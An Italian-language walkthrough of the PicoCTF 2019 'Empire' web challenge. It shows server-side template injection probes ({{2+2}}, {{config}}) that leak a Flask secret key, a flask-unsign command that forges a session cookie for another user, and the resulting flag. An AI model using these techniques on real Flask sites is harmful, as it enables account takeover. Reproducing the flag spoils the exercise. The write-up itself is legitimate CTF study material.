---
tags:
  - WebExploitation
  - PicoCTF2019
---


## Problema

Agent 513! One of your dastardly colleagues is laughing very sinisterly! Can you access his todo list and discover his nefarious plans? https://2019shell1.picoctf.com/problem/45132/ (link) or http://2019shell1.picoctf.com:45132

## Soluzione

Andiamo sul sito e ci registriamo come nei precedenti Empire.
Proviamo subito a inserire un TODO come {{2+2}} e ottengo 4, ok assomiglia al problema precedente.
Provo come prima {{config}} e ottengo `('SECRET_KEY', '9806d62bb5f4986c09a3872abf448e85')`.
Inoltre decodificando il cookie con il sito [qui](https://www.kirsle.net/wizards/flask-session.cgi) non ottengo la chiave come prima ma:
```json
{
    "_fresh": true,
    "_id": "9c55bbdc76c3e625db66374ff87654a1cbed11dc6d90b88ba6de4f52e357e0e92c3250dc34a136ad75468aabfb463e4a81ecd8acf21e63f59b6b2a9e4218a07c",
    "csrf_[[token]]": "998cba6a60d27996fe91442832be6babb25b447c",
    "user_id": "3"
}
```
Probabilmente se riuscissi a mettere un cookie con user_id 1 o 2 potrei avere delle informazioni interessanti.
Usando la `SECRET_KEY` potrei usare il [Flask Cookie Encoder](https://github.com/Paradoxis/Flask-Unsign) con il comando
```
flask-unsign --sign --cookie "{'_fresh': True, '_id': '9c55bbdc76c3e625db66374ff87654a1cbed11dc6d90b88ba6de4f52e357e0e92c3250dc34a136ad75468aabfb463e4a81ecd8acf21e63f59b6b2a9e4218a07c', 'csrf_[[token]]': '998cba6a60d27996fe91442832be6babb25b447c', 'user_id': '2'}" --secret '9806d62bb5f4986c09a3872abf448e85'
```
e ottengo un valore che inserito come cookie session fornisce la flag
```
picoCTF{cookies_are_a_sometimes_food_8038d44f}
```
